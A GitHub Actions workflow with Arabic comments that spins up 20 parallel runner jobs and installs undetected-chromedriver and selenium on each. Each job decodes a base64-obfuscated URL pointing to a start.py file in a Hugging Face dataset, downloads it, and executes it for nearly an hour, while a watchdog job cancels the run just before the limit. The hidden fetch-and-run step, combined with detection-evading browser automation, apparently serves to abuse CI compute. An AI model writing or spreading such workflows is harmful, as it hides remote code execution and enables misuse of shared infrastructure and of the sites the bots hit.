name: Nexus Automation Controller

on:
  workflow_dispatch:

concurrency:
  group: nexus-env-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Job 1: المشرف الزمني - إلغاء السيولة التشغيلية بعد 59 دقيقة
  # =================================================================
  workflow-watchdog:
    name: "Global Watchdog"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      TIMEOUT_LIMIT: 3540
    steps:
      - name: Start Countdown Routine
        run: |
          echo "[MONITOR] Countdown initiated for Workflow Run ID: ${{ github.run_id }}"
          echo "[MONITOR] Waiting for timer delay (${TIMEOUT_LIMIT}s)..."

          sleep "${TIMEOUT_LIMIT}"

          echo "[MONITOR] Interval expired — canceling execution stream."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[MONITOR] Cancel request successfully broadcasted."

  # =================================================================
  # Job 2: تشغيل العُقد الموازية عبر الماتريكس
  # =================================================================
  cluster-node:
    name: "ClusterNode-${{ matrix.cluster_id }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        cluster_id: [9901, 9902, 9903, 9904, 9905, 9906, 9907, 9908, 9909, 9910, 9911, 9912, 9913, 9914, 9915, 9916, 9917, 9918, 9919, 9920]

    steps:
      # -----------------------------------------------------------------
      # الخطوة 1: تحديث الحزم وتثبيت التبعيات في خطوة واحدة
      # -----------------------------------------------------------------
      - name: Provision Node Environment
        run: |
          echo "[SETUP] Preparing system environment for ClusterNode-${{ matrix.cluster_id }}..."
          sudo apt-get update -qq
          sudo apt-get install -y --no-install-recommends curl python3-pip
          pip3 install --quiet undetected-chromedriver selenium requests psutil

      # -----------------------------------------------------------------
      # الخطوة 2: استخراج وجلب الملف المصدري
      # -----------------------------------------------------------------
      - name: Retrieve Core Binary Script
        run: |
          echo "[FETCH] Decoding endpoint payload target..."
          PAYLOAD_B64="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
          ENDPOINT_URL=$(echo "$PAYLOAD_B64" | base64 --decode)

          echo "[FETCH] Downloading execution artifact..."
          curl -sL "$ENDPOINT_URL" -o node_worker.py
          echo "[FETCH] Artifact node_worker.py successfully retrieved."

      # -----------------------------------------------------------------
      # الخطوة 3: التشغيل المقيد بوقت عبر أمر timeout لتبسيط الإدارة
      # -----------------------------------------------------------------
      - name: Launch Managed Task Process
        run: |
          echo "[EXECUTE] Starting node_worker.py on ClusterNode-${{ matrix.cluster_id }}..."
          echo "[EXECUTE] Execution bound by maximum wall-time of 3540 seconds."

          # استخدام أمر timeout للتحكم التلقائي في زمن العملية بدون حاجة لـ PID أو sleep
          timeout --kill-after=10s 3540s python3 node_worker.py || {
            EXIT_CODE=$?
            if [ $EXIT_CODE -eq 124 ]; then
              echo "[TIMEOUT] Process reached maximum runtime boundary (3540s) and was terminated."
            else
              echo "[COMPLETE] Process exited with status code: $EXIT_CODE"
            fi
          }
